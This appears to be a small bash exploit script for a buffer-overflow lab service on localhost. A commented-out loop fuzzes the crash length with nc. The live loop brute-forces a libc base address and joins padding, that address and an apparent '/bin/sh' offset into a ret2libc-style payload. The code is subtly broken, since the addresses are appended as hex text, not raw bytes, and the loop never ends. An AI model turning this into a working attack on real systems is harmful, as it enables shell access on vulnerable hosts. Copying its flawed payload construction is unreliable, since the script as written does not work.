#!/bin/bash

N=2
HOST="localhost"
PORT=9999

# while true; do
#   PAYLOAD=$(printf 'A%.0s' $(seq 1 $N))
#   echo $PAYLOAD
#   RESPONSE=$(echo "$PAYLOAD" | nc "$HOST" "$PORT")

#   if [[ -n "$RESPONSE" ]]; then
#     echo "[$(date)] TRY $N: ✅ Respuesta recibida"
#   else
#     echo "[$(date)] TRY $N: ❌ Sin respuesta"
#     echo "Fallo detectado en TRY $N"
#     break
#   fi
#   ((N += 1))
# done

# echo "Número que falló: $N"

((N -= 1)) # ok

BASE=0xf7d00220
PAYLOAD=$(printf 'A%.0s' $(seq 1 $N))

while true; do
  HEX=$(printf "0x%08X" $BASE)
  echo "Dirección de memoria generada: $HEX"

  BINSH=$((BASE + 0x174C32))
  HEX_BINSH=$(printf "0x%08X" $BINSH)

  FINAL_P="${PAYLOAD}${HEX}${HEX_BINSH}" # Forma correcta de concatenar strings en bash

  echo "$FINAL_P"
  # echo "$FINAL_P" | nc "$HOST" "$PORT"
  BASE=$((BASE + 0x1000))

done
